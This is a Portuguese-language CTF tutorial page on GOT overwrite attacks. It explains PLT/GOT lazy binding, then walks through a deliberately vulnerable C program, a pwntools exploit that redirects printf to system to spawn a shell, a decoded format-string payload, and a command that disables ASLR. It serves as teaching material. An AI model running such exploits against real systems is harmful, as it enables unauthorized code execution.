---
title: GOT Overwrite
sidebar_position: 4
---

A GOT (Global Offset Table) guarda os endereços das funções de bibliotecas que o binário usa. Toda chamada a uma função da libc passa por um ponteiro nessa tabela. Com uma escrita arbitrária, trocamos esse ponteiro, e a próxima chamada àquela função vai para onde quisermos.

O exemplo clássico:

```c
fgets(buffer, sizeof(buffer), stdin);
printf(buffer);       // depois de trocar printf@got por system: system(buffer)
```

**Pré-requisitos**: uma vulnerabilidade de escrita arbitrária (format string, heap, índice fora dos limites) e GOT gravável, ou seja, **sem Full [RELRO](../protections.mdx#relro-relocation-read-only)**.

## PLT e GOT

O binário não sabe em que endereço a libc será carregada. Por isso, uma chamada a `puts` é compilada como `call puts@plt`: um pequeno trecho de código (stub) na PLT (Procedure Linkage Table) que faz `jmp` para o endereço guardado em `puts@got`.

Com *lazy binding* (o padrão sem Full RELRO), a GOT só é preenchida na primeira chamada de cada função:

<Flow
  title="Lazy binding: caminho de uma chamada a puts"
  nodes={[
    {id: 'libc', x: 2, y: 0, t: 'puts', sub: 'libc', kind: 'data'},
    {id: 'code', x: 0, y: 1, t: 'call puts@plt', sub: 'código do programa'},
    {id: 'plt', x: 1, y: 1, t: 'puts@plt', sub: 'jmp [puts@got]', kind: 'meta'},
    {id: 'got', x: 2, y: 1, t: 'puts@got', sub: 'ponteiro gravável', kind: 'ptr'},
    {id: 'stub', x: 2, y: 2, t: 'puts@plt+6', sub: 'push idx; jmp PLT0', kind: 'meta'},
    {id: 'res', x: 1, y: 2, t: '_dl_runtime_resolve', sub: 'ld.so', kind: 'neutral'},
  ]}
  edges={[
    {from: 'code', to: 'plt'},
    {from: 'plt', to: 'got'},
    {from: 'got', to: 'stub', label: '1ª chamada', dashed: true},
    {from: 'got', to: 'libc', label: 'depois'},
    {from: 'stub', to: 'res'},
    {from: 'res', to: 'got', label: 'grava &puts'},
  ]}
/>

- **Primeira chamada**: `puts@got` ainda aponta de volta para a PLT (`puts@plt+6`). Esse trecho empilha o índice da função e pula para `PLT0`, que chama `_dl_runtime_resolve` (no `ld.so`, em modo usuário). O resolvedor acha `puts` na libc, **grava o endereço na GOT** e pula para a função.
- **Chamadas seguintes**: o `jmp [puts@got]` vai direto para a libc.

Como a GOT é escrita em tempo de execução, ela fica em uma página gravável durante toda a vida do processo. Com Full RELRO, tudo é resolvido na inicialização e a página vira somente leitura.

No GDB (binário de 32 bits, sem PIE):

```
pwndbg> disas 0x8049040
Dump of assembler code for function fgets@plt:
   0x08049040 <+0>:     jmp    DWORD PTR ds:0x804c010      ← fgets@got
   0x08049046 <+6>:     push   0x8                         ← índice da relocação
   0x0804904b <+11>:    jmp    0x8049020                   ← PLT0

pwndbg> x/wx 0x804c010                  (antes da primeira chamada)
0x804c010 <fgets@got.plt>:      0x08049046                 ← fgets@plt+6

pwndbg> x/wx 0x804c010                  (depois)
0x804c010 <fgets@got.plt>:      0xf7ddea80                 ← fgets na libc
```

O comando `got` do pwndbg lista a tabela inteira com o estado de cada entrada.

Podemos usar a GOT para duas coisas em CTFs:

- **Ler** uma entrada já resolvida dá um endereço da libc (é o leak usado em [ret2libc](./rop/ret2libc.mdx)).
- **Escrever** em uma entrada redireciona a função.

## O ataque

<Flow
  title="Depois da sobrescrita, toda chamada a printf executa system"
  nodes={[
    {id: 'sys', x: 2, y: 0, t: 'system', sub: 'system(buffer)', kind: 'danger'},
    {id: 'code', x: 0, y: 1, t: 'call printf@plt', sub: 'printf(buffer)'},
    {id: 'plt', x: 1, y: 1, t: 'printf@plt', sub: 'jmp [printf@got]', kind: 'meta'},
    {id: 'got', x: 2, y: 1, t: 'printf@got', sub: 'sobrescrito', kind: 'ctrl'},
    {id: 'pf', x: 2, y: 2, t: 'printf', sub: 'libc', kind: 'neutral'},
  ]}
  edges={[
    {from: 'code', to: 'plt'},
    {from: 'plt', to: 'got'},
    {from: 'got', to: 'sys', label: 'agora'},
    {from: 'got', to: 'pf', dashed: true, label: 'antes'},
  ]}
/>

### Qual entrada sobrescrever

A função trocada precisa ser chamada **depois** da escrita, de preferência com um argumento que controlamos:

| Substituir | Por | Quando |
|---|---|---|
| `printf`, `puts`, `strlen`, `atoi`, `free` | `system` | A função recebe nosso input como 1º argumento: vira `system(input)` |
| `exit`, `__stack_chk_fail` | `main` ou a função vulnerável | Transformar um único disparo em um loop |
| Qualquer função chamada adiante | `win` ou um *one_gadget* | Não é preciso controlar argumentos |

Cuidado ao trocar uma função que o programa usa em outros lugares antes de chegar ao ponto desejado: todas as chamadas são redirecionadas.

## Exemplo: Format String

```c
#include <stdio.h>

void vuln() {
    char buffer[300];

    while(1) {
        fgets(buffer, sizeof(buffer), stdin);   // sem overflow
        printf(buffer);                         // format string
        puts("");
    }
}

int main() {
    vuln();
    return 0;
}
```

Binário de 32 bits, sem PIE, Partial RELRO. O laço dá quantas chamadas a `printf` quisermos. Plano: trocar `printf@got` por `system` e enviar `/bin/sh`.

### 1. Offset do buffer

```
%p %p %p %p %p %p
0x12c 0xf7f975c0 0x8049191 0x17 0x25207025 0x70252070
                                ↑ "%p %" em little endian: o 5º argumento é o buffer
```

### 2. Endereço de `printf@got`

Sem PIE, é fixo:

```
$ objdump -R ./got_overwrite-32 | grep printf
0804c00c R_386_JUMP_SLOT   printf@GLIBC_2.0
```

No pwntools: `elf.got['printf']`.

### 3. Endereço de `system`

Se o programa usasse `system` em algum lugar, bastaria `elf.plt['system']`. Aqui não usa, então precisamos do endereço na libc: `base da libc + offset de system`.

O offset vem do arquivo da libc (`libc.sym['system']` no pwntools, ou `readelf -s libc.so.6 | grep " system"`). A base depende do ambiente:

- **Local, sem ASLR** (para estudo): a base é fixa. Veja em `ldd ./binario`, em `vmmap` no GDB, ou em `/proc/<pid>/maps`. Para desligar o ASLR temporariamente: `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space` (o valor padrão é `2`).
- **Com ASLR / remoto**: é preciso vazar um endereço da libc na mesma execução. Com a própria format string: leia uma entrada já resolvida da GOT (`%N$s` apontando para `puts@got`) ou um endereço da libc que esteja na stack, e subtraia o offset correspondente. Use a libc do servidor para os offsets.

### 4. Exploit

```py
from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
libc = elf.libc
libc.address = 0xf7d63000          # ASLR desligado. Com ASLR, calcule a partir de um leak

p = process()

# fmtstr_payload(offset do buffer, {onde escrever: o que escrever})
payload = fmtstr_payload(5, {elf.got['printf']: libc.sym['system']})
p.sendline(payload)

p.sendline(b'/bin/sh')             # na próxima volta do laço: printf(buffer) → system("/bin/sh\n")
p.interactive()
```

O `\n` que o `fgets` deixa no fim não atrapalha o `system`.

## Por dentro do payload

O `fmtstr_payload` gerou, para `printf@got = 0x0804c00c` e `system = 0xf7db6660`:

```
%96c%16$hhn%6c%17$hhn%117c%18$hhn%28c%19$hhn\x0c\xc0\x04\x08\x0d\xc0\x04\x08\x0e\xc0\x04\x08\x0f\xc0\x04\x08
```

São quatro escritas de 1 byte (`%hhn`), uma para cada byte do endereço:

| Trecho | Contador após imprimir | Grava em | Byte |
|---|---|---|---|
| `%96c%16$hhn` | 96 = `0x60` | `0x0804c00c` (arg 16) | `60` |
| `%6c%17$hhn` | 102 = `0x66` | `0x0804c00d` (arg 17) | `66` |
| `%117c%18$hhn` | 219 = `0xdb` | `0x0804c00e` (arg 18) | `db` |
| `%28c%19$hhn` | 247 = `0xf7` | `0x0804c00f` (arg 19) | `f7` |

Resultado em memória: `60 66 db f7` = `0xf7db6660`.

**Por que argumento 16?** A format string tem 44 bytes, que ocupam `44 / 4 = 11` argumentos a partir do 5º. Os endereços começam em `5 + 11 = 16`. Quando o tamanho não é múltiplo de 4 (8 em 64 bits), o pwntools acrescenta padding para alinhar.

**Ordem dos bytes.** O contador do `%n` só cresce. Aqui os bytes já estão em ordem crescente (`60 < 66 < db < f7`). Quando não estão, o pwntools reordena as escritas ou usa o estouro do `%hhn`: como só o byte baixo do contador é gravado, imprimir até `0x130` grava `0x30`.

Em 64 bits a lógica é a mesma, com argumentos de 8 bytes e os endereços **sempre depois** da format string, por causa dos bytes nulos (veja [Format Strings](./format-strings.md#escrita-arbitrária)).

## Créditos

- [Ir0nstone](https://ir0nstone.gitbook.io/notes/binexp/stack/got-overwrite/exploiting-a-got-overwrite): binário de exemplo
- [Ian](https://ian.nl/blog/format-string-got-overwrite-attack): análise do payload do pwntools
